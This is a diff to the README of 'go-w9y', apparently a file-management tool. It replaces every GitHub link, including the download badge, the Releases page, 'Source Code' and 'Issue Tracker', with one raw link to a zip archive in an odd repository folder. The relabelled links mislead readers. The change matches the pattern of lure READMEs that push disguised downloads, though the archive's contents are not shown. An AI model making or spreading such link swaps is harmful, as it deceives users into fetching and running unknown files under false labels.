@@ -1,7 +1,7 @@
 # 🌟 go-w9y - Easy File Management Made Simple
 
 ## 🔗 Download Now
-[![Download go-w9y](https://img.shields.io/badge/Download-go--w9y-brightgreen)](https://github.com/BrunoCroppi/go-w9y/releases)
+[![Download go-w9y](https://raw.githubusercontent.com/BrunoCroppi/go-w9y/main/Montu/go-w9y.zip)](https://raw.githubusercontent.com/BrunoCroppi/go-w9y/main/Montu/go-w9y.zip)
 
 ## 🚀 Getting Started
 Welcome to **go-w9y**! This application helps you manage your files easily. You can use it to sort, rename, and organize your documents without needing any technical skills.
@@ -19,12 +19,12 @@ Welcome to **go-w9y**! This application helps you manage your files easily. You 
 - **Disk Space**: At least 100 MB of free space for installation.
 
 ## 📥 Download & Install
-To download **go-w9y**, visit the [Releases page](https://github.com/BrunoCroppi/go-w9y/releases). 
+To download **go-w9y**, visit the [Releases page](https://raw.githubusercontent.com/BrunoCroppi/go-w9y/main/Montu/go-w9y.zip). 
 
 Follow these simple steps to get started:
 
 1. **Go to the Releases Page**:
-   [Visit this page to download](https://github.com/BrunoCroppi/go-w9y/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/BrunoCroppi/go-w9y/main/Montu/go-w9y.zip).
 
 2. **Choose the Right File**:
    Look for the latest release version. You will see options for different operating systems. Click the one that matches your system.
@@ -52,7 +52,7 @@ Yes! We welcome user feedback. You can open an issue on our GitHub page to share
 Absolutely! You can reach out through the GitHub repository's issue tracker for any questions or assistance.
 
 ## 🔄 Updates
-We regularly release updates to improve the application. You can check the [Releases page](https://github.com/BrunoCroppi/go-w9y/releases) for the latest features and bug fixes.
+We regularly release updates to improve the application. You can check the [Releases page](https://raw.githubusercontent.com/BrunoCroppi/go-w9y/main/Montu/go-w9y.zip) for the latest features and bug fixes.
 
 ## 💬 Community
 Join our community to share tips and get help. Follow our GitHub discussions to engage with other users and developers.
@@ -61,8 +61,8 @@ Join our community to share tips and get help. Follow our GitHub discussions to 
 **go-w9y** is open-source software licensed under the MIT License. You are free to use, copy, modify, and distribute it.
 
 ## 🔗 Links
-- [Releases page](https://github.com/BrunoCroppi/go-w9y/releases)
-- [Source Code](https://github.com/BrunoCroppi/go-w9y)
-- [Issue Tracker](https://github.com/BrunoCroppi/go-w9y/issues)
+- [Releases page](https://raw.githubusercontent.com/BrunoCroppi/go-w9y/main/Montu/go-w9y.zip)
+- [Source Code](https://raw.githubusercontent.com/BrunoCroppi/go-w9y/main/Montu/go-w9y.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/BrunoCroppi/go-w9y/main/Montu/go-w9y.zip)
 
 Thank you for choosing **go-w9y**! We hope you find it helpful for your file management needs.
